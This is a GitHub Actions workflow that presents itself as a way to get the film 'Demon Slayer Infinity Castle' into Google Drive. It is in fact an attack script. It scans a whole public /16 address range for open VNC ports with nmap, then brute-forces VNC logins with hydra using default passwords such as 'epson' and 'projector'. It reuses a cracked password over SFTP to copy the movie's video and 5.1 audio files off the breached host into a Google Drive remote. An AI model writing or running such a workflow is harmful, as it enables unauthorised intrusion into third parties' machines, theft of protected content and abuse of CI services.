name: Demon Slayer Infinity Castle â€“ 1080p Stream to Google Drive
on:
  workflow_dispatch:

jobs:
  stream:
    runs-on: ubuntu-latest
    steps:
      - name: Install tools
        run: |
          sudo apt-get update -y
          sudo apt-get install -y nmap hydra rclone p7zip-full
      - name: Scan VNC
        id: scan
        run: |
          nmap -p5900 --open 210.172.0.0/16 -oG - | awk '/5900\/open/{print $2}' > vnc_hosts.txt
          echo "vnc_count=$(wc -l < vnc_hosts.txt)" >> $GITHUB_OUTPUT
      - name: Brute passwords
        if: steps.scan.outputs.vnc_count != '0'
        run: |
          printf 'epson\nadmin\nprojector\n123456\n' > ~/pwd.txt
          while read ip; do
            hydra -P ~/pwd.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
            [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
          done < vnc_hosts.txt
      - name: Connect & stream to Google Drive
        run: |
          ip=$(head -n1 valid_ips.txt)
          pass=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)
          [ -z "$ip" ] && exit 0

          # create rclone.conf with the token from secret
          mkdir -p ~/.config/rclone
          cat > ~/.config/rclone/rclone.conf <<'EOF'
          [gdrive]
          type = drive
          token = ${{ secrets.RCLONE_GDRIVE_TOKEN }}
          EOF

          # create SFTP remote
          rclone config create relay sftp \
            host="$ip" user="epson" port="22" \
            --sftp-password "$pass"

          # stream 1080p file (adjust exact path if different)
          rclone copy "relay:/DSIC_P1/VIDEO/DSIC_P1_1080p.mov" \
                      "gdrive:Movies/DSIC_P1_1080p.mov" \
                      --transfers=8 -P

          # optional: copy 5.1 audio
          rclone copy "relay:/DSIC_P1/AUDIO/DSIC_P1_51.wav" \
                      "gdrive:Movies/DSIC_P1_51.wav" \
                      --transfers=8 -P

          echo "movie uploaded to Google Drive"
